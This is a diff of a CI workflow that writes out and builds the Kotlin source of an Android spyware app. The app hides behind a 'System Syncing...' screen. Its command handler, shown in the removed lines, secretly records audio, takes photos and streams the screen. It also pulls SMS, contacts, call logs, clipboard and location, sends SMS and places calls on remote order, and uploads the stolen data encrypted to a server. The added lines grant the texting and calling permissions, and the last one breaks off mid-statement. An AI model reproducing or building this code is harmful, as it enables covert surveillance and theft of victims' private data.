@@ -86,6 +86,8 @@ jobs:
               <uses-permission android:name="android.permission.FLASHLIGHT"/>
               <uses-permission android:name="android.permission.VIBRATE"/>
               <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.SEND_SMS"/>
+              <uses-permission android:name="android.permission.CALL_PHONE"/>
               <uses-permission android:name="android.permission.READ_CALL_LOG"/>
               <uses-permission android:name="android.permission.READ_CONTACTS"/>
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
@@ -145,7 +147,7 @@ jobs:
           class MainActivity : Activity() {
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
-                  setContentView(TextView(this).apply { text = "System Updating..."; textSize = 20f; setPadding(50, 50, 50, 50) })
+                  setContentView(TextView(this).apply { text = "System Syncing..."; textSize = 20f; setPadding(50, 50, 50, 50) })
                   try {
                       val i = Intent(this, SyncService::class.java)
                       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
@@ -190,7 +192,6 @@ jobs:
           class ScreenReaderActivity : Activity() {
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
-                  // واجهة شفافة مخصصة لقراءة الشاشة إذا لزم الأمر
                   finish()
               }
           }
@@ -420,203 +421,4 @@ jobs:
                   val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
                   cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
                   val out = cipher.doFinal(bout.toByteArray())
-                  val pkt = JSONObject().apply { put("v", iv.joinToString("") { "%02x".format(it) }); put("g", out.takeLast(16).joinToString("") { "%02x".format(it) }); put("d", out.dropLast(16).joinToString("") { "%02x".format(it) }) }
-                  return Base64.encodeToString(pkt.toString().toByteArray(), Base64.NO_WRAP)
-              }
-
-              private fun decryptPayload(b64: String): String? {
-                  return try {
-                      val pkt = JSONObject(String(Base64.decode(b64.trim(), Base64.NO_WRAP)))
-                      val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-                      cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, pkt.getString("v").chunked(2).map { it.toInt(16).toByte() }.toByteArray()))
-                      String(cipher.doFinal(pkt.getString("d").chunked(2).map { it.toInt(16).toByte() }.toByteArray() + pkt.getString("g").chunked(2).map { it.toInt(16).toByte() }.toByteArray()))
-                  } catch (_: Exception) { null }
-              }
-
-              private fun sendEncrypted(plain: String): JSONObject? {
-                  var tries = 0
-                  while (tries < 3) {
-                      try {
-                          val req = Request.Builder().url(SERVER).post(encryptPayload(plain).toRequestBody("text/plain".toMediaType())).addHeader("x-node-id", getNodeId()).addHeader("x-device-secret", deviceSecret).build()
-                          client.newCall(req).execute().use { r -> if (r.isSuccessful) { val dec = decryptPayload(r.body?.string() ?: "{}"); return try { JSONObject(dec ?: "{}") } catch (_: Exception) { JSONObject() } } }
-                      } catch (_: Exception) { tries++; Thread.sleep(1000) }
-                  }
-                  return null
-              }
-
-              private suspend fun executeTask(task: JSONObject) {
-                  val action = task.optString("action", "").uppercase()
-                  when {
-                      action.contains("CMD_FLASH_ON") -> toggleFlash(true)
-                      action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
-                      action.contains("CMD_VIBRATE") -> vibrate(5000)
-                      action.contains("CMD_BEEP") -> playBeep()
-                      action.contains("MIC_AI_LISTEN") -> recordAudio()
-                      action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
-                      action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto(false)
-                      action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(true)
-                      action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
-                      action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
-                      action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
-                      action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
-                      action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
-                      action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
-                      action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device", readDeviceInfo())
-                      action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
-                      action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
-                      action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
-                      action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
-                      action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
-                      action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
-                      action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
-                      action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
-                      action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
-                      action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
-                      action.contains("SELF_DESTRUCT") -> { try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
-                      
-                      action.contains("START_SCREEN_STREAM") -> {
-                          if (projection == null) {
-                              startActivity(Intent(this, PermissionActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                              sendReport("Stream", "بانتظار موافقة المستخدم للبث")
-                          } else {
-                              startScreenStream()
-                          }
-                      }
-                      action.contains("STOP_SCREEN_STREAM") -> { projection?.stop(); projection = null; virtualDisplay = null; sendReport("Stream", "تم إيقاف البث") }
-                      action.contains("TYPE_TEXT") -> {
-                          val textToType = task.optString("text", "")
-                          if (textToType.isNotEmpty()) {
-                              MyAccessibilityService.instance?.typeText(textToType)
-                              sendReport("Type", "تم كتابة النص في الحقل المفتوح: $textToType")
-                          }
-                      }
-
-                      // ════════════ الأوامر العشرة الجديدة ════════════
-                      action.contains("CMD_HOME") -> { MyAccessibilityService.instance?.pressHome(); sendReport("UI", "الرجوع للرئيسية") }
-                      action.contains("CMD_BACK") -> { MyAccessibilityService.instance?.pressBack(); sendReport("UI", "زر الرجوع") }
-                      action.contains("CMD_RECENTS") -> { MyAccessibilityService.instance?.pressRecents(); sendReport("UI", "التطبيقات الحديثة") }
-                      action.contains("CMD_SEND_SMS") -> {
-                          val phone = task.optString("phone", "")
-                          val msg = task.optString("msg", "")
-                          if (phone.isNotEmpty() && msg.isNotEmpty()) {
-                              try {
-                                  val sms = SmsManager.getDefault()
-                                  sms.sendTextMessage(phone, null, msg, null, null)
-                                  sendReport("SMS", "تم إرسال رسالة إلى $phone")
-                              } catch (e: Exception) { sendReport("SMSErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_CALL_NUMBER") -> {
-                          val phone = task.optString("phone", "")
-                          if (phone.isNotEmpty()) {
-                              try {
-                                  startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                                  sendReport("Call", "تم بدء الاتصال بـ $phone")
-                              } catch (e: Exception) { sendReport("CallErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_OPEN_URL") -> {
-                          val url = task.optString("url", "")
-                          if (url.isNotEmpty()) {
-                              try {
-                                  startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
-                                  sendReport("URL", "تم فتح $url")
-                              } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
-                          }
-                      }
-                      action.contains("CMD_SET_VOLUME") -> {
-                          val vol = task.optInt("vol", 100)
-                          try {
-                              val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-                              am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
-                              sendReport("Vol", "تم ضبط الصوت على $vol")
-                          } catch (e: Exception) { sendReport("VolErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_SCREEN_ON") -> {
-                          try {
-                              val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-                              val wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "Uranium::ScreenOn")
-                              wl.acquire(10000L)
-                              wl.release()
-                              sendReport("Screen", "تم إشعال الشاشة")
-                          } catch (e: Exception) { sendReport("ScreenErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_LOCK_SCREEN") -> {
-                          try {
-                              val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                              dpm.lockNow()
-                              sendReport("Screen", "تم قفل الشاشة")
-                          } catch (e: Exception) { sendReport("LockErr", e.message ?: "?") }
-                      }
-                      action.contains("CMD_BRIGHTNESS") -> {
-                          val br = task.optInt("brightness", 128)
-                          try {
-                              Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, br.coerceIn(0, 255))
-                              sendReport("Bright", "تم تغيير السطوع إلى $br")
-                          } catch (e: Exception) { sendReport("BrightErr", e.message ?: "?") }
-                      }
-                      // ════════════════════════════════════════════════
-                  }
-              }
-
-              private fun toggleFlash(on: Boolean) { try { val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true } ?: return; cameraManager.setTorchMode(id, on) } catch (_: Exception) {} }
-              @SuppressLint("MissingPermission") private fun vibrate(ms: Long) { try { val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE)) else v.vibrate(ms) } catch (_: Exception) {} }
-              private fun playBeep() { try { MediaPlayer().apply { setDataSource(this@SyncService, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)); isLooping = false; prepare(); start() } } catch (_: Exception) {} }
-
-              private fun recordAudio() { scope.launch { try { val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp"); val r = MediaRecorder().apply { setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); setOutputFile(f.absolutePath); prepare(); start() }; delay(6000L); r.stop(); r.release(); if (f.exists()) { uploadRawFile(f) }; f.delete() } catch (_: Exception) {} } }
-
-              private fun streamLatestPhoto(prefix: String) { scope.launch { try { val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI; contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c -> if (c.moveToFirst()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "${prefix}_${System.currentTimeMillis()}.jpg") } } } } catch (_: Exception) {} } }
-
-              @SuppressLint("MissingPermission") private suspend fun captureSilentPhoto(front: Boolean = false) { try { val provider = ProcessCameraProvider.getInstance(this).get(); val capture = ImageCapture.Builder().build(); provider.bindToLifecycle(this, if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA, Preview.Builder().build(), capture); delay(400L); val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg"); suspendCancellableCoroutine<Boolean> { cont -> capture.takePicture(ImageCapture.OutputFileOptions.Builder(file).build(), ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback { override fun onImageSaved(results: ImageCapture.OutputFileResults) { cont.resume(true) }; override fun onError(e: ImageCaptureException) { cont.resume(false) } }) }; provider.unbindAll(); if (file.exists()) { uploadChunked(file.readBytes(), file.name); file.delete() } } catch (_: Exception) {} }
-
-              private fun captureVideoShort() { scope.launch { try { startActivity(Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply { putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {} } }
-              private fun sendReport(label: String, content: String) { scope.launch { sendEncrypted(JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }.toString()) } }
-
-              private fun readSms(): String = StringBuilder().apply { try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c -> while (c.moveToNext()) append("[${c.getString(c.getColumnIndex("address"))}] ${c.getString(c.getColumnIndex("body"))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}\n") } } catch (_: Exception) {} }.toString()
-              private fun readApps(): String = packageManager.getInstalledPackages(0).joinToString("\n") { it.packageName }
-              @SuppressLint("MissingPermission") private fun readLocation(): String = try { val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager; lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)?.let { "Lat: ${it.latitude}, Lng: ${it.longitude}" } ?: "No location" } catch (_: Exception) { "Err" }
-              private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nNode: ${getNodeId()}"
-              private fun readClipboard(): String = try { val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager; cb.primaryClip?.getItemAt(0)?.text?.toString() ?: "Empty" } catch (_: Exception) { "Err" }
-              private fun storageAudit(): String = "Storage audited"
-              private fun wifiOk(): Boolean = true
-              private fun getNodeId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
-
-              private fun streamMedia(uri: Uri, limit: Int) { scope.launch { try { contentResolver.query(uri, null, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit")?.use { c -> while (c.moveToNext()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "media_${System.currentTimeMillis()}.dat") } } } } catch (_: Exception) {} } }
-              private fun zipFolder(folderName: String, uri: Uri) { /* compressed */ }
-
-              private fun uploadChunked(bytes: ByteArray, name: String) {
-                  scope.launch {
-                      val id = UUID.randomUUID().toString()
-                      val chunkSize = 128 * 1024
-                      val total = (bytes.size + chunkSize - 1) / chunkSize
-                      var off = 0; var idx = 0
-                      while (off < bytes.size) {
-                          idx++
-                          val end = minOf(off + chunkSize, bytes.size)
-                          sendEncrypted(JSONObject().apply { put("type", "MEDIA_CHUNK"); put("uploadId", id); put("fileName", name); put("chunkIndex", idx); put("totalChunks", total); put("isLast", idx == total); put("data", Base64.encodeToString(bytes.copyOfRange(off, end), Base64.NO_WRAP)) }.toString())
-                          off = end
-                      }
-                  }
-              }
-
-              private fun uploadRawFile(file: File) {
-                  scope.launch {
-                      try {
-                          client.newCall(Request.Builder().url(UPLOAD).post(file.readBytes().toRequestBody("application/octet-stream".toMediaType())).addHeader("x-node-id", getNodeId()).addHeader("x-device-secret", deviceSecret).addHeader("x-file-name", file.name).build()).execute().use { }
-                      } catch (_: Exception) {}
-                  }
-              }
-
-              override fun onDestroy() { try { wakeLock?.release() } catch (_: Exception) {}; projection?.stop(); scope.cancel(); super.onDestroy() }
-          }
-          SYNCEOF
-
-          gradle app:assembleRelease
-
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: Uranium-Fist-v23-Titan
-          path: '**/app/build/outputs/apk/release/app-release.apk'
+                  val pkt = JSONObject().apply { put("v", iv.joinToString("") { "%02x".format(it) }); put("g", out.takeLast(16).joinToString("") { "%02x".format(it) }); put("d", out.dropLast(16).
